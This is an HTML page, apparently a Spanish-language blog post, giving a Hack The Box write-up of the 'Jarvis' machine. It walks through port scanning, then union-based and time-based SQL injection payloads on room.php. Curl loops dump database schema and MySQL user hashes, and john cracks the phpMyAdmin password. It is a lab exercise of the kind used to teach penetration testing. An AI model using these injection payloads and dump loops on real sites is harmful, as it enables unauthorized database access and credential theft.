@@ -1,0 +1,925 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>            Hack The Box Jarvis - K4miyo      Ciberseguridad!      </title>
+<meta name="description" content="Resolución de la máquina Jarvis en la plataforma de Hack The Box">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="K4miyo | Ciberseguridad!">
+<meta property="og:title" content="Hack The Box Jarvis">
+<meta property="og:url" content="http://localhost:4000/htb-jarvis/">
+
+
+  <meta property="og:description" content="Resolución de la máquina Jarvis en la plataforma de Hack The Box">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-jarvis/jarvis.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2021-12-31T00:00:00-06:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-jarvis/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "K4miyo",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="K4miyo | Ciberseguridad! Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links">
+<li class="masthead__menu-item">
+              <a href="/">Home</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/year-archive/">Artículos</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/categories/">Categorías</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/tags/">Etiquetas</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/buscador/">Buscador</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/about/">Contacto</a>
+            </li>
+</ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1">
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Hack The Box Jarvis</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="K4miyo" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">K4miyo</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Cyber Threat Intelligence Analyst
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/k4miyo" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Hack The Box Jarvis">
+    <meta itemprop="description" content="Resolución de la máquina Jarvis en la plataforma de Hack The Box">
+    <meta itemprop="datePublished" content="December 31, 2021">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Hack The Box Jarvis
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2021-12-31T00:00:00-06:00">December 31, 2021 </time> 
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-jarvis/banner-jarvis.jpg" alt=""></p>
+
+<h2 id="jarvis">Jarvis</h2>
+<p>Se procede con la fase de reconocimiento lanzando primeramente un <code class="language-plaintext highlighter-rouge">ping</code> a la dirección IP 10.10.10.143.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.143
+PING 10.10.10.143 <span class="o">(</span>10.10.10.143<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 10.10.10.143: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>137 ms
+
+<span class="nt">---</span> 10.10.10.143 ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 136.756/136.756/136.756/0.000 ms
+</code></pre></div></div>
+
+<p>De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de <code class="language-plaintext highlighter-rouge">nmap</code> para determinar los puertos abiertos de la máquina y exportanto la información al archivo <strong>allPorts</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-T5</span> <span class="nt">-v</span> <span class="nt">-n</span> 10.10.10.143 <span class="nt">-oG</span> allPorts
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-12-26 20:08 CST
+Initiating Ping Scan at 20:08
+Scanning 10.10.10.143 <span class="o">[</span>4 ports]
+Completed Ping Scan at 20:08, 0.16s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
+Initiating SYN Stealth Scan at 20:08
+Scanning 10.10.10.143 <span class="o">[</span>65535 ports]
+Discovered open port 22/tcp on 10.10.10.143
+Discovered open port 80/tcp on 10.10.10.143
+SYN Stealth Scan Timing: About 48.38% <span class="k">done</span><span class="p">;</span> ETC: 20:09 <span class="o">(</span>0:00:33 remaining<span class="o">)</span>
+Discovered open port 64999/tcp on 10.10.10.143
+Completed SYN Stealth Scan at 20:09, 56.60s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.10.10.143
+Host is up <span class="o">(</span>0.16s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65532 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+64999/tcp open  unknown
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>56.92 seconds
+           Raw packets sent: 67041 <span class="o">(</span>2.950MB<span class="o">)</span> | Rcvd: 67038 <span class="o">(</span>2.682MB<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Mediante la función <a href="/extractPorts">extractPorts</a> definida a nivel de <code class="language-plaintext highlighter-rouge">zsh</code> , se obtiene la información más relevante de la captura grepeable.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ extractPorts allPorts
+───────┬─────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼─────────────────────────────────────
+   1   │ 
+   2   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
+   3   │ 
+   4   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.10.10.143
+   5   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 22,80,64999
+   6   │ 
+   7   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
+</code></pre></div></div>
+
+<p>A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80,64999 10.10.10.143 <span class="nt">-oN</span> targeted
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-12-26 20:10 CST
+Nmap scan report <span class="k">for </span>10.10.10.143
+Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp    open  http    Apache httpd 2.4.25 <span class="o">((</span>Debian<span class="o">))</span>
+|_http-title: Stark Hotel
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not <span class="nb">set</span>
+|_http-server-header: Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)</span>
+64999/tcp open  http    Apache httpd 2.4.25 <span class="o">((</span>Debian<span class="o">))</span>
+|_http-title: Site doesn<span class="s1">'t have a title (text/html).
+|_http-server-header: Apache/2.4.25 (Debian)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 17.80 seconds
+</span></code></pre></div></div>
+
+<p>Vemos que se encuentran abiertos los puertos 80 y 64999 asociados al servicio HTTP, por lo que antes de ver el contenido vía web, vamos a ver a lo que nos enfrentamos con la herramienta <code class="language-plaintext highlighter-rouge">whatweb</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ whatweb http://10.10.10.143/
+http://10.10.10.143/ <span class="o">[</span>200 OK] Apache[2.4.25], Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[supersecurehotel@logger.htb], HTML5, HTTPServer[Debian Linux][Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)]</span>, IP[10.10.10.143], JQuery, Modernizr[2.6.2.min], Open-Graph-Protocol, Script, Title[Stark Hotel], UncommonHeaders[ironwaf], X-UA-Compatible[IE<span class="o">=</span>edge]
+❯ whatweb http://10.10.10.143:64999/
+http://10.10.10.143:64999/ <span class="o">[</span>200 OK] Apache[2.4.25], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)]</span>, IP[10.10.10.143], UncommonHeaders[ironwaf]
+</code></pre></div></div>
+
+<p>Ahora si procedemos a ver el contenido vía web para ambos puertos:</p>
+
+<p><img src="/assets/images/htb-jarvis/jarvis-web.png" alt=""></p>
+
+<p><img src="/assets/images/htb-jarvis/jarvis-web1.png" alt=""></p>
+
+<p>Como por el puerto 64999 no nos muestra información que podamos analizar, vamos a empezar por el puerto 80 y tratar de ver los hipervínculos si nos lleva a algún lado haciendo <em>hovering</em> y tenemos el archivo <code class="language-plaintext highlighter-rouge">rooms-suites.php</code> en donde vemos algunas habitaciones que al hacer <em>hovering</em> vemos algo curioso <code class="language-plaintext highlighter-rouge">room.php?cod=1</code> en donde el número cambia de acuerdo con la habitación que seleccionemos; por lo que ya debemos estar pensando que debe existir una base de datos por detrás.</p>
+
+<p><img src="/assets/images/htb-jarvis/jarvis-web2.png" alt=""></p>
+
+<p>Si tratamos de hacer un <em>fuzzing</em> para descubrir hasta que número hay algún resultado, nos aparecerá el banner mostrado en el puerto 64999; por lo que vamos a omitir el uso de la herramienta <code class="language-plaintext highlighter-rouge">wfuzz</code> o similares y mejor vamos a utilizar <code class="language-plaintext highlighter-rouge">nmap</code> para tratar de descubrir nuevas rutas en el servidor web.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">--script</span> http-enum <span class="nt">-p80</span> 10.10.10.143 <span class="nt">-oN</span> webScan
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-12-26 20:40 CST
+Nmap scan report <span class="k">for </span>10.10.10.143
+Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-enum: 
+|   /phpmyadmin/: phpMyAdmin
+|   /css/: Potentially interesting directory w/ listing on <span class="s1">'apache/2.4.25 (debian)'</span>
+|   /images/: Potentially interesting directory w/ listing on <span class="s1">'apache/2.4.25 (debian)'</span>
+|_  /js/: Potentially interesting directory w/ listing on <span class="s1">'apache/2.4.25 (debian)'</span>
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>14.10 seconds
+</code></pre></div></div>
+
+<p>Tenemos un recurso interesante, <code class="language-plaintext highlighter-rouge">phpmyadmin</code> que si ingresamos, tenemos el panel de login:</p>
+
+<p><img src="/assets/images/htb-jarvis/jarvis-web3.png" alt=""></p>
+
+<p>En este punto, sabemos que existe una base de datos en donde se tienen las habitaciones y la podemos cambiar a través de la URL; por lo que vamos a tratar de realizar unas inyeccions SQL para que ver pasa.</p>
+
+<ul>
+  <li>10.10.10.143/room.php?cod=3’ or 1=1– - &gt; Desaparece las imagen y el precio.</li>
+  <li>10.10.10.143/room.php?cod=1 and sleep(5)– - &gt; Vemos que la web tarda 5 segundos en responder, por lo tanto podría ser vulnerable a SQLi basada en tiempo.</li>
+  <li>10.10.10.143/room.php?cod=0 union select 1,2,3,4,5,6,7– - &gt; Vemos que se nos muestran las etiquetas para las columnas de las tablas (se estuvo intentando desde 1 hasta donde se observara algún resultado y bajo un número que no mostrata información, en este caso 0). Por lo tanto, ya podríamos escoger un valor de los observamos para inyectar comandos y obtener información sobre la base de datos.</li>
+</ul>
+
+<p><img src="/assets/images/htb-jarvis/jarvis-web4.png" alt=""></p>
+
+<ul>
+  <li>10.10.10.143/room.php?cod=0 union select 1,2,database(),4,5,6,7– - &gt; Sustituimos la etiqueta del número 3 por el comando <code class="language-plaintext highlighter-rouge">databse()</code> y al cargar deberíamos de ver que en el lugar donde antes estaba el 3, ahora vemos el nombre de la base de datos, para este caso es <strong>hotel</strong>.</li>
+</ul>
+
+<p><img src="/assets/images/htb-jarvis/jarvis-web5.png" alt=""></p>
+
+<ul>
+  <li>10.10.10.143/room.php?cod=0 union select 1,2,schema_name,4,5,6,7 from information_schema.schemata limit 0,1– - &gt; Vemos las bases de datos en el servidor y vamos recorriendolas con <code class="language-plaintext highlighter-rouge">limit 0,1</code>, <code class="language-plaintext highlighter-rouge">limit 1,1</code>, <code class="language-plaintext highlighter-rouge">limit 2,1</code> y así sucesivamente. Por lo que tenemos las siguientes bases de datos:
+    <ul>
+      <li>hotel</li>
+      <li>information_schema</li>
+      <li>mysql</li>
+      <li>performance_schema</li>
+    </ul>
+  </li>
+</ul>
+
+<p>Una forma de obtener las tablas sería con el siguiente comando:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>0 10<span class="si">)</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="s2">"[*] DB </span><span class="nv">$i</span><span class="s2">: </span><span class="si">$(</span>curl <span class="nt">-s</span> <span class="s2">"http://10.10.10.143/room.php?cod=0%20union%20select%201,2,schema_name,4,5,6,7%20from%20information_schema.schemata%20limit%20</span><span class="nv">$i</span><span class="s2">,1--%20-"</span> | <span class="nb">grep</span> <span class="s2">"price-room"</span> | <span class="nb">awk</span> <span class="s1">'{print $2}'</span> <span class="nv">FS</span><span class="o">=</span><span class="s2">"&gt;"</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">'&lt;'</span> <span class="nt">-f</span> 1<span class="si">)</span><span class="s2">"</span><span class="p">;</span> <span class="nb">sleep </span>2<span class="p">;</span> <span class="k">done</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> DB 0: hotel
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> DB 1: information_schema
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> DB 2: mysql
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> DB 3: performance_schema
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> DB 4: 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> DB 5: 
+^C#
+</code></pre></div></div>
+
+<p>De manera similar, podríamos obtener los nombres de las tablas con la sentencia <code class="language-plaintext highlighter-rouge">10.10.10.143/room.php?cod=0 union select 1,2,table_name,4,5,6,7 from information_schema.tables limit 0,1-- -</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>0 150<span class="si">)</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="s2">"[*] Tabla </span><span class="nv">$i</span><span class="s2">: </span><span class="si">$(</span>curl <span class="nt">-s</span> <span class="s2">"http://10.10.10.143/room.php?cod=0%20union%20select%201,2,table_name,4,5,6,7%20from%20information_schema.tables%20limit%20</span><span class="nv">$i</span><span class="s2">,1--%20-"</span> | <span class="nb">grep</span> <span class="s2">"price-room"</span> | <span class="nb">awk</span> <span class="s1">'{print $2}'</span> <span class="nv">FS</span><span class="o">=</span><span class="s2">"&gt;"</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">'&lt;'</span> <span class="nt">-f</span> 1<span class="si">)</span><span class="s2">"</span><span class="p">;</span> <span class="nb">sleep </span>2<span class="p">;</span> <span class="k">done</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Tabla 0: room
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Tabla 1: ALL_PLUGINS
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Tabla 2: APPLICABLE_ROLES
+^C#                  
+</code></pre></div></div>
+
+<p>Para este caso y para adelantar un poco, vamos a empezar desde la tabla 100:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>100 150<span class="si">)</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="s2">"[*] Tabla </span><span class="nv">$i</span><span class="s2">: </span><span class="si">$(</span>curl <span class="nt">-s</span> <span class="s2">"http://10.10.10.143/room.php?cod=0%20union%20select%201,2,table_name,4,5,6,7%20from%20information_schema.tables%20limit%20</span><span class="nv">$i</span><span class="s2">,1--%20-"</span> | <span class="nb">grep</span> <span class="s2">"price-room"</span> | <span class="nb">awk</span> <span class="s1">'{print $2}'</span> <span class="nv">FS</span><span class="o">=</span><span class="s2">"&gt;"</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">'&lt;'</span> <span class="nt">-f</span> 1<span class="si">)</span><span class="s2">"</span><span class="p">;</span> <span class="nb">sleep </span>2<span class="p">;</span> <span class="k">done</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Tabla 100: slow_log
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Tabla 101: table_stats
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Tabla 102: tables_priv
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Tabla 103: time_zone
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Tabla 104: time_zone_leap_second
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Tabla 105: time_zone_name
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Tabla 106: time_zone_transition
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Tabla 107: time_zone_transition_type
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Tabla 108: user
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Tabla 109: accounts
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Tabla 110: cond_instances
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Tabla 111: events_stages_current
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Tabla 112: events_stages_history
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Tabla 113: events_stages_history_long
+^C#                                                                                                                              
+</code></pre></div></div>
+
+<p>Ya vemos una tabla interesante <strong>user</strong>; asi que vamos a tratar de obtener las columnas con la inyección <code class="language-plaintext highlighter-rouge">10.10.10.143/room.php?cod=0 union select 1,2,column_name,4,5,6,7 from information_schema.columns where table_name='user' limit 0,1-- -</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>0 100<span class="si">)</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="s2">"[*] Columna </span><span class="nv">$i</span><span class="s2">: </span><span class="si">$(</span>curl <span class="nt">-s</span> <span class="s2">"http://10.10.10.143/room.php?cod=0%20union%20select%201,2,column_name,4,5,6,7%20from%20information_schema.columns%20where%20table_name%20=%20'user'limit%20</span><span class="nv">$i</span><span class="s2">,1--%20-"</span> | <span class="nb">grep</span> <span class="s2">"price-room"</span> | <span class="nb">awk</span> <span class="s1">'{print $2}'</span> <span class="nv">FS</span><span class="o">=</span><span class="s2">"&gt;"</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">'&lt;'</span> <span class="nt">-f</span> 1<span class="si">)</span><span class="s2">"</span><span class="p">;</span> <span class="nb">sleep </span>2<span class="p">;</span> <span class="k">done</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Columna 0: Host
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Columna 1: User
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Columna 2: Password
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Columna 3: Select_priv
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Columna 4: Insert_priv
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Columna 5: Update_priv
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Columna 6: Delete_priv
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Columna 7: Create_priv
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Columna 8: Drop_priv
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Columna 9: Reload_priv
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Columna 10: Shutdown_priv
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Columna 11: Process_priv
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Columna 12: File_priv
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Columna 13: Grant_priv
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Columna 14: References_priv
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Columna 15: Index_priv
+^C#  
+</code></pre></div></div>
+
+<p>Vemos dos columnas que ya nos llaman la atención, <strong>User</strong> y <strong>Password</strong>; así que ahora vamos a tratar de obtener la información de la tabla <strong>user</strong> y en específico, dichas columnas. Eso lo lograremos con la inyección <code class="language-plaintext highlighter-rouge">10.10.10.143/room.php?cod=0 union select 1,2,group_contact(User,0x3a,Password),4,5,6,7 from mysql.user</code> (<strong>Nota</strong>: Determinamos que la tabla <strong>user</strong> se encuentra en la base de datos <strong>mysql</strong> debido a que el sitio web no presenta una página relacionada al login, por lo tanto la base de datos <strong>hotel</strong> no podría contener alguna tabla en donde se presenten usuarios y contraseñas):</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>0 10<span class="si">)</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="s2">"[*] Data </span><span class="nv">$i</span><span class="s2">: </span><span class="si">$(</span>curl <span class="nt">-s</span> <span class="s2">"http://10.10.10.143/room.php?cod=0%20union%20select%201,2,group_concat(User,0x3a,Password),4,5,6,7%20from%20mysql.user%20limit%20</span><span class="nv">$i</span><span class="s2">,1--%20-"</span> | <span class="nb">grep</span> <span class="s2">"price-room"</span> | <span class="nb">awk</span> <span class="s1">'{print $2}'</span> <span class="nv">FS</span><span class="o">=</span><span class="s2">"&gt;"</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">'&lt;'</span> <span class="nt">-f</span> 1<span class="si">)</span><span class="s2">"</span><span class="p">;</span> <span class="nb">sleep </span>2<span class="p">;</span> <span class="k">done</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Data 0: DBadmin:<span class="k">*</span>2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Data 1: 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Data 2: 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Data 3: 
+^C#        
+</code></pre></div></div>
+
+<p>Ya tenemos unas credenciales que podrían ser del panel de administración de phpmyadmin y debemos recordar que la contraseña se encuentra hasheada, por lo tanto vamos a utilizar la herramienta <code class="language-plaintext highlighter-rouge">john</code> para crackearla, así que nos creamos un archivo en donde pongamos el hash (DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0) y procedemos a utilizar la herramienta:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt <span class="nb">hash
+</span>Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>mysql-sha1, MySQL 4.1+ <span class="o">[</span>SHA1 256/256 AVX2 8x]<span class="o">)</span>
+Warning: no OpenMP support <span class="k">for </span>this <span class="nb">hash type</span>, consider <span class="nt">--fork</span><span class="o">=</span>8
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+imissyou         <span class="o">(</span>DBadmin<span class="o">)</span>
+1g 0:00:00:00 DONE <span class="o">(</span>2021-12-26 21:50<span class="o">)</span> 20.00g/s 19520p/s 19520c/s 19520C/s shadow1..ashlee
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed
+</code></pre></div></div>
+
+<p>Como siempre, guardamos las credenciales que tengamos y procedemos a utilizarlas en el panel de login.</p>
+
+<p><img src="/assets/images/htb-jarvis/jarvis-web6.png" alt=""></p>
+
+<p>Ya nos encontramos en el dentro del panel de administración de phpmyadmin. Si checamos la versión, vemos que estamos frente a la 4.8.0, por lo que podríamos buscar algún exploit público que nos ayude.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ searchsploit phpmyadmin 4.8
+<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+ Exploit Title                                                                                 |  Path
+<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+phpMyAdmin 4.8 - Cross-Site Request Forgery                                                    | php/webapps/46982.txt
+phpMyAdmin 4.8.0 &lt; 4.8.0-1 - Cross-Site Request Forgery                                        | php/webapps/44496.html
+phpMyAdmin 4.8.1 - <span class="o">(</span>Authenticated<span class="o">)</span> Local File Inclusion <span class="o">(</span>1<span class="o">)</span>                                    | php/webapps/44924.txt
